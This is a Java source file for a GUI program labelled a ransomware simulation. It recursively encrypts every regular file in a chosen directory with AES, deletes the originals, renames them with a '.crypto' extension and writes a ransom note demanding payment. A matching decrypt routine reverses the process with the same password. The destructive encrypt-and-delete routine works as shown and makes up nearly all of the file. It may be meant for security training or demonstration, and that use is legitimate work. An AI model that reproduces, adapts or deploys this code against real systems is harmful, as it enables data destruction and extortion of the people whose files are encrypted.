import javax.swing.*;
import javax.crypto.*;
import javax.crypto.spec.*;
import java.awt.*;
import java.io.*;
import java.nio.file.*;
import java.security.*;
import java.security.spec.*;

public class RansomwareSimulation {
    private static final String[] RANSOMWARE_EXTENSIONS = {
        ".crypto", ".wannacry", ".locky", ".cryptolocker", ".petya", ".badrabbit",
        ".notpetya", ".nopetya", ".ryuk", ".djvu", ".phobos", ".dharma", ".cont",
        ".nephilim", ".avaddon", ".makop", ".ransomexx", ".egregor", ".hellokitty"
    };

    private JFrame frame;
    private JPasswordField passwordField;

    public static void main(String[] args) {
        SwingUtilities.invokeLater(() -> new RansomwareSimulation().createGUI());
    }

    private void createGUI() {
        frame = new JFrame("Ransomware Simulation");
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setSize(500, 300);
        frame.setResizable(false);
        frame.setLayout(new BorderLayout());

        JLabel titleLabel = new JLabel("SAMPLE RANSOMWARE SIMULATION", SwingConstants.CENTER);
        titleLabel.setFont(new Font("Arial", Font.BOLD, 16));
        titleLabel.setForeground(Color.BLUE);
        frame.add(titleLabel, BorderLayout.NORTH);

        JPanel centerPanel = new JPanel();
        centerPanel.setLayout(new GridBagLayout());
        GridBagConstraints gbc = new GridBagConstraints();
        gbc.insets = new Insets(5, 10, 5, 10);

        gbc.gridx = 0;
        gbc.gridy = 0;
        JLabel passwordLabel = new JLabel("Password:");
        passwordLabel.setFont(new Font("Arial", Font.PLAIN, 12));
        centerPanel.add(passwordLabel, gbc);

        gbc.gridx = 1;
        passwordField = new JPasswordField(20);
        centerPanel.add(passwordField, gbc);

        gbc.gridx = 0;
        gbc.gridy = 1;
        JButton encryptButton = new JButton("Encrypt Directory");
        encryptButton.setBackground(Color.GREEN);
        encryptButton.setForeground(Color.WHITE);
        encryptButton.setPreferredSize(new Dimension(150, 30));
        encryptButton.addActionListener(e -> browseEncrypt());
        centerPanel.add(encryptButton, gbc);

        gbc.gridx = 1;
        JButton decryptButton = new JButton("Decrypt Directory");
        decryptButton.setBackground(Color.RED);
        decryptButton.setForeground(Color.WHITE);
        decryptButton.setPreferredSize(new Dimension(150, 30));
        decryptButton.addActionListener(e -> browseDecrypt());
        centerPanel.add(decryptButton, gbc);

        frame.add(centerPanel, BorderLayout.CENTER);

        JLabel warningLabel = new JLabel("Ensure the password is remembered for decryption.");
        warningLabel.setFont(new Font("Arial", Font.PLAIN, 10));
        warningLabel.setForeground(new Color(139, 0, 0));
        warningLabel.setHorizontalAlignment(SwingConstants.CENTER);
        frame.add(warningLabel, BorderLayout.SOUTH);

        frame.setLocationRelativeTo(null);
        frame.setVisible(true);
    }

    private void browseEncrypt() {
        FileDialog dialog = new FileDialog(frame, "Select Directory to Encrypt", FileDialog.LOAD);
        System.setProperty("apple.awt.fileDialogForDirectories", "true");
        dialog.setDirectory(System.getProperty("user.home"));
        dialog.setVisible(true);
        System.setProperty("apple.awt.fileDialogForDirectories", "false");
        
        String dirPath = dialog.getDirectory();
        String fileName = dialog.getFile();
        
        if (dirPath != null && fileName != null) {
            String password = new String(passwordField.getPassword());
            if (password.isEmpty()) {
                JOptionPane.showMessageDialog(frame, "Please enter a password for encryption.", 
                    "Error", JOptionPane.ERROR_MESSAGE);
                return;
            }
            File selected = new File(dirPath, fileName);
            File directory = selected.isDirectory() ? selected : selected.getParentFile();
            new Thread(() -> encryptDirectory(directory, password)).start();
        }
    }

    private void browseDecrypt() {
        FileDialog dialog = new FileDialog(frame, "Select Directory to Decrypt", FileDialog.LOAD);
        System.setProperty("apple.awt.fileDialogForDirectories", "true");
        dialog.setDirectory(System.getProperty("user.home"));
        dialog.setVisible(true);
        System.setProperty("apple.awt.fileDialogForDirectories", "false");
        
        String dirPath = dialog.getDirectory();
        String fileName = dialog.getFile();
        
        if (dirPath != null && fileName != null) {
            String password = new String(passwordField.getPassword());
            if (password.isEmpty()) {
                JOptionPane.showMessageDialog(frame, "Please enter a password for decryption.", 
                    "Error", JOptionPane.ERROR_MESSAGE);
                return;
            }
            File selected = new File(dirPath, fileName);
            File directory = selected.isDirectory() ? selected : selected.getParentFile();
            new Thread(() -> decryptDirectory(directory, password)).start();
        }
    }

    private byte[] deriveKey(String password, byte[] salt) throws Exception {
        SecretKeyFactory factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256");
        KeySpec spec = new PBEKeySpec(password.toCharArray(), salt, 65536, 256);
        SecretKey tmp = factory.generateSecret(spec);
        return tmp.getEncoded();
    }

    private void encryptFile(File file, String password) {
        try {
            // Skip already-encrypted or non-regular files
            String fileName = file.getName().toLowerCase();
            for (String ext : RANSOMWARE_EXTENSIONS) {
                if (fileName.endsWith(ext)) {
                    return;
                }
            }
            if (!file.isFile()) {
                return;
            }

            byte[] salt = new byte[16];
            byte[] iv = new byte[16];
            SecureRandom random = new SecureRandom();
            random.nextBytes(salt);
            random.nextBytes(iv);

            byte[] key = deriveKey(password, salt);
            SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
            IvParameterSpec ivSpec = new IvParameterSpec(iv);

            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.ENCRYPT_MODE, keySpec, ivSpec);

            byte[] fileData = Files.readAllBytes(file.toPath());
            byte[] encryptedData = cipher.doFinal(fileData);

            File encryptedFile = new File(file.getAbsolutePath() + ".crypto");
            try (FileOutputStream fos = new FileOutputStream(encryptedFile)) {
                fos.write(salt);
                fos.write(iv);
                fos.write(encryptedData);
            }

            Files.delete(file.toPath());
        } catch (Exception e) {
            System.err.println("Encryption failed for " + file.getName() + ": " + e.getMessage());
        }
    }

    private void decryptFile(File file, String password) {
        try {
            try (FileInputStream fis = new FileInputStream(file)) {
                byte[] salt = new byte[16];
                byte[] iv = new byte[16];
                fis.read(salt);
                fis.read(iv);
                byte[] encryptedData = fis.readAllBytes();

                byte[] key = deriveKey(password, salt);
                SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
                IvParameterSpec ivSpec = new IvParameterSpec(iv);

                Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
                cipher.init(Cipher.DECRYPT_MODE, keySpec, ivSpec);

                byte[] originalData = cipher.doFinal(encryptedData);

                String originalPath;
                String filePath = file.getAbsolutePath();
                if (filePath.toLowerCase().endsWith(".crypto")) {
                    originalPath = filePath.substring(0, filePath.length() - 7);
                } else {
                    originalPath = filePath + ".decrypted";
                }

                Files.write(Paths.get(originalPath), originalData);
                Files.delete(file.toPath());
            }
        } catch (Exception e) {
            System.err.println("Decryption failed for " + file.getName() + ": " + e.getMessage());
        }
    }

    private void createRansomNote(File directory) {
        try {
            File ransomNote = new File(directory, "RANSOM_NOTE.txt");
            try (PrintWriter writer = new PrintWriter(ransomNote)) {
                writer.println("Your files have been Attacked!");
                writer.println("To Access them, you must pay a ransom.");
                writer.println("Contact us at ransomware@example.com for instructions.");
                writer.println("Ensure to provide proof of payment to receive the decryption key.");
            }
        } catch (IOException e) {
            System.err.println("Failed to create ransom note: " + e.getMessage());
        }
    }

    private void encryptDirectory(File directory, String password) {
        try {
            Files.walk(directory.toPath())
                .filter(Files::isRegularFile)
                .forEach(path -> encryptFile(path.toFile(), password));
            
         
            createRansomNote(directory);
            
            SwingUtilities.invokeLater(() -> 
                JOptionPane.showMessageDialog(frame, "Directory encrypted successfully.", 
                    "Encryption", JOptionPane.INFORMATION_MESSAGE));
        } catch (Exception e) {
            SwingUtilities.invokeLater(() -> 
                JOptionPane.showMessageDialog(frame, "Encryption failed: " + e.getMessage(), 
                    "Error", JOptionPane.ERROR_MESSAGE));
        }
    }

    private void decryptDirectory(File directory, String password) {
        try {
            boolean[] noteRemoved = {false};
            
            Files.walk(directory.toPath())
                .filter(Files::isRegularFile)
                .forEach(path -> {
                    String fileName = path.getFileName().toString();
                    String lowerName = fileName.toLowerCase();
                    
                    for (String ext : RANSOMWARE_EXTENSIONS) {
                        if (lowerName.endsWith(ext)) {
                            decryptFile(path.toFile(), password);
                            return;
                        }
                    }
                    
                    if (fileName.equals("RANSOM_NOTE.txt")) {
                        try {
                            Files.delete(path);
                            noteRemoved[0] = true;
                        } catch (IOException e) {
                            System.err.println("Failed to remove ransom note: " + e.getMessage());
                        }
                    }
                });
            
            String message = "Directory decrypted successfully.\nRansom note " + 
                           (noteRemoved[0] ? "removed" : "not found.");
            SwingUtilities.invokeLater(() -> 
                JOptionPane.showMessageDialog(frame, message, 
                    "Decryption", JOptionPane.INFORMATION_MESSAGE));
        } catch (Exception e) {
            SwingUtilities.invokeLater(() -> 
                JOptionPane.showMessageDialog(frame, "Decryption failed: " + e.getMessage(), 
                    "Error", JOptionPane.ERROR_MESSAGE));
        }
    }
}
